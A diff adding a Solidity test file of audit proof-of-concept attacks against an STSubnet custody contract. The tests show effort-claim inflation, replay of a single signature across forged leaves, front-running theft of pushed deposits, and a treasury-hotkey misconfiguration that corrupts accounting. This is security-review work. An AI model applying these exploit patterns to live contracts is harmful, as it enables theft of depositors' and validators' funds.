@@ -1,0 +1,211 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+import {STBase} from "./utils/STBase.sol";
+import {STSubnet} from "../src/STSubnet.sol";
+import {MerkleBuilder} from "./utils/MerkleBuilder.sol";
+
+/// @dev Adversarial PoCs for the custody/claims review. These are NOT part of
+///      the shipped suite; they demonstrate gaps the 114 green tests don't cover.
+contract AttackPoC is STBase {
+    uint256 constant DEPOSIT = 1_000e9; // feePool = 10% = 100e9
+
+    // =====================================================================
+    // FINDING A: claimedEffort is unbound from the committed tree.
+    // A validator submits a *fully valid* tiny tree but claims an astronomically
+    // larger effort; proveTrailSamples credits the claim verbatim; no dispute
+    // can reduce it; the cheater captures ~the entire feePool, starving honest
+    // validators.
+    // =====================================================================
+    function test_A_claimedEffort_inflation_capturesWholeFeePool() public {
+        uint256 honest = _registerValidator2();
+        _deposit(NO_ID, noAddr, DEPOSIT); // feePool[0] = 100e9
+        _afterClose(0);
+
+        // Honest validator: real 7-leaf tree, real Σcoverage = 91.
+        _submit(0, honest, val2Wallet, 7);
+        _prove(0, honest, 7);
+        assertEq(st.effort(0, honest), 91);
+
+        // Cheater: commits the canonical 4-leaf tree (every leaf VALID), but
+        // claims 1e27 effort instead of the true Σcoverage (46).
+        uint256 BOGUS = 1e27;
+        bytes32 root = _effortRoot(4);
+        vm.prank(valWallet);
+        st.submitTrails(0, VAL_ID, root, BOGUS);
+        _prove(0, VAL_ID, 4); // samples are the real, valid leaves -> passes
+
+        assertEq(st.effort(0, VAL_ID), BOGUS, "inflated effort credited verbatim");
+        assertEq(st.totalEffort(0), BOGUS + 91);
+
+        // Precompute leaves/proofs (view calls to `st`) BEFORE expectRevert.
+        STSubnet.TrailLeaf memory l0 = _mkLeaf(0);
+        STSubnet.TrailLeaf memory l1 = _mkLeaf(1);
+        bytes32[] memory p0 = _effortProof(4, 0);
+        bytes32[] memory p1 = _effortProof(4, 1);
+
+        // No dispute can void it: every committed leaf is individually valid ...
+        vm.expectRevert("ST: leaf valid");
+        st.disputeTrailLeaf(0, VAL_ID, l0, p0);
+        // ... and no two distinct leaves share an index or pathId.
+        vm.expectRevert("ST: no double-count");
+        st.disputeTrailLeafPair(0, VAL_ID, l0, p0, l1, p1);
+
+        _toFinalize(0);
+        st.finalizeEpoch(0);
+
+        uint256 fee = st.feePool(0);
+        st.claimValidator(0, VAL_ID);
+        st.claimValidator(0, honest);
+
+        uint256 cheaterPay = staking.stakes(TREASURY, st.validatorColdkey(VAL_ID));
+        uint256 honestPay = staking.stakes(TREASURY, st.validatorColdkey(honest));
+        emit log_named_uint("feePool", fee);
+        emit log_named_uint("cheater got", cheaterPay);
+        emit log_named_uint("honest got ", honestPay);
+        // Cheater takes essentially the entire pool; honest validator ~0.
+        assertGt(cheaterPay, (fee * 99) / 100, "cheater captured >99% of bounty");
+        assertEq(honestPay, 0, "honest validator starved to zero (floor)");
+    }
+
+    // =====================================================================
+    // FINDING A (amplifier): one server-signed finalDigest -> unlimited valid
+    // leaves. Signatures are checked over `finalDigest` ONLY; `coverage`,
+    // `pathId`, `index` are unsigned. So the same (finalDigest, serverSig,
+    // vpkSig) triple can be replayed across many leaves with distinct
+    // (index, pathId) and arbitrary `coverage` — all pass sample verification,
+    // none are dispute-voidable. "Effort cannot be fabricated without real
+    // trail-walking" (WP §9.3) does not hold on-chain.
+    // =====================================================================
+    function test_A2_signatureReplay_manyValidLeavesFromOneTrail() public {
+        _deposit(NO_ID, noAddr, DEPOSIT);
+        _afterClose(0);
+
+        // Build 4 leaves that all reuse ONE finalDigest + ONE signature pair
+        // (as if the validator walked a single real trail), but with distinct
+        // index/pathId and inflated coverage.
+        bytes32 dig = keccak256("one-real-trail-final");
+        bytes32 sr = keccak256("one-server-r");
+        bytes32 ss = keccak256("one-server-s");
+        bytes32 vr = keccak256("one-vpk-r");
+        bytes32 vs = keccak256("one-vpk-s");
+        uint256 N = 4;
+        STSubnet.TrailLeaf[] memory leaves = new STSubnet.TrailLeaf[](N);
+        bytes32[] memory hashes = new bytes32[](N);
+        for (uint256 i = 0; i < N; i++) {
+            leaves[i] = STSubnet.TrailLeaf({
+                index: i,
+                pathId: keccak256(abi.encodePacked("distinct-path", i)),
+                coverage: 1_000_000, // forged, unsigned
+                serverKeyId: SERVER_KEY_ID,
+                finalDigest: dig,
+                serverSigR: sr,
+                serverSigS: ss,
+                vpkSigR: vr,
+                vpkSigS: vs
+            });
+            hashes[i] = st.trailLeafHash(leaves[i]);
+        }
+        bytes32 root = MerkleBuilder.root(hashes);
+
+        vm.prank(valWallet);
+        st.submitTrails(0, VAL_ID, root, 4_000_000);
+
+        (,, uint64 seedBlock,,,) = st.trailSubmission(0, VAL_ID);
+        vm.roll(uint256(seedBlock) + 1);
+        vm.setBlockhash(seedBlock, keccak256(abi.encodePacked("bh", seedBlock)));
+        uint256[] memory idx = st.sampleIndices(0, VAL_ID, N);
+        STSubnet.TrailLeaf[] memory sl = new STSubnet.TrailLeaf[](idx.length);
+        bytes32[][] memory pf = new bytes32[][](idx.length);
+        for (uint256 i = 0; i < idx.length; i++) {
+            sl[i] = leaves[idx[i]];
+            pf[i] = MerkleBuilder.proof(hashes, idx[i]);
+        }
+        st.proveTrailSamples(0, VAL_ID, N, sl, pf); // all "valid" -> credited
+        assertEq(st.effort(0, VAL_ID), 4_000_000, "replayed-signature leaves credited");
+
+        // A pair-dispute on two of the identical-signature leaves fails: they
+        // differ in index AND pathId, so neither double-count rule triggers.
+        vm.expectRevert("ST: no double-count");
+        st.disputeTrailLeafPair(
+            0, VAL_ID, leaves[0], MerkleBuilder.proof(hashes, 0),
+            leaves[1], MerkleBuilder.proof(hashes, 1)
+        );
+    }
+
+    // =====================================================================
+    // FINDING B: push-then-credit deposits are grabbable. The README trust
+    // note only covers deposit()/commitOperator() (gated to operatorAddress),
+    // but fundFeePool() is PERMISSIONLESS — anyone can absorb a NO's pushed-
+    // but-uncredited α into the fee pool, total-loss griefing the depositor.
+    // =====================================================================
+    function test_B_fundFeePool_stealsPushedDeposit_permissionless() public {
+        // Honest NO pushes α onto the custody slot (the transferStake step),
+        // intending to call deposit() next block.
+        _push(DEPOSIT);
+        assertEq(_treasuryStake(), DEPOSIT);
+        assertEq(st.accountedStake(), 0);
+
+        // Attacker (not an operator, not owner) front-runs with fundFeePool.
+        vm.prank(rando);
+        st.fundFeePool(0, DEPOSIT);
+        assertEq(st.feePool(0), DEPOSIT, "victim's push diverted to bounty pool");
+        assertEq(st.accountedStake(), DEPOSIT);
+
+        // The NO's own deposit now reverts: the α it pushed is gone.
+        vm.prank(noAddr);
+        vm.expectRevert("ST: stake not received");
+        st.deposit(NO_ID, DEPOSIT);
+        assertEq(st.DT(0, NO_ID), 0, "NO credited nothing; alpha lost to fee pool");
+    }
+
+    // =====================================================================
+    // FINDING B (variant): a rival operator attributes another NO's pushed
+    // deposit to its OWN pool.
+    // =====================================================================
+    function test_B2_rivalOperator_stealsPushedDeposit() public {
+        _registerOperator2();
+
+        // NO #1 pushes its deposit.
+        _push(DEPOSIT);
+
+        // NO #2 front-runs and attributes it to pool #2.
+        vm.prank(no2Addr);
+        st.deposit(NO2_ID, DEPOSIT);
+        assertEq(st.DT(0, NO2_ID), DEPOSIT, "rival captured the deposit");
+        assertEq(st.DT(0, NO_ID), 0);
+
+        // NO #1's deposit reverts; its α now backs pool #2's payouts.
+        vm.prank(noAddr);
+        vm.expectRevert("ST: stake not received");
+        st.deposit(NO_ID, DEPOSIT);
+    }
+
+    // =====================================================================
+    // FINDING C: registerOperator does not reject minerHotkey == treasuryHotkey.
+    // If an operator's pool hotkey is the treasury hotkey, sweepPool measures
+    // the ENTIRE treasury balance as that pool's "emission" and double-counts it
+    // into accountedStake — corrupting custody so that pool can drain everyone
+    // else's deposits. (Owner-gated misconfig; missing input validation.)
+    // =====================================================================
+    function test_C_minerHotkeyEqualsTreasury_inflatesAccounting() public {
+        // A legitimate deposit lands D onto the treasury hotkey.
+        _deposit(NO_ID, noAddr, DEPOSIT);
+        assertEq(st.accountedStake(), DEPOSIT);
+        assertEq(_treasuryStake(), DEPOSIT);
+
+        // Owner (mis)registers a pool whose minerHotkey IS the treasury hotkey.
+        uint256 badNo = 99;
+        metagraph.setNeuron(6, TREASURY, proxyMirror);
+        vm.prank(owner);
+        st.registerOperator(badNo, keccak256("bad-coldkey"), TREASURY);
+
+        // Permissionless sweep now books the whole treasury as badNo's emission.
+        st.sweepPool(badNo);
+
+        assertEq(st.poolAccrued(badNo), DEPOSIT, "whole treasury booked as fake emission");
+        assertEq(st.accountedStake(), 2 * DEPOSIT, "deposit double-counted into custody ledger");
+        // -> badNo's poolTotal will include D it never earned; claiming it drains
+        //    NO_ID's real deposit. Custody conservation is broken.
+    }
+}
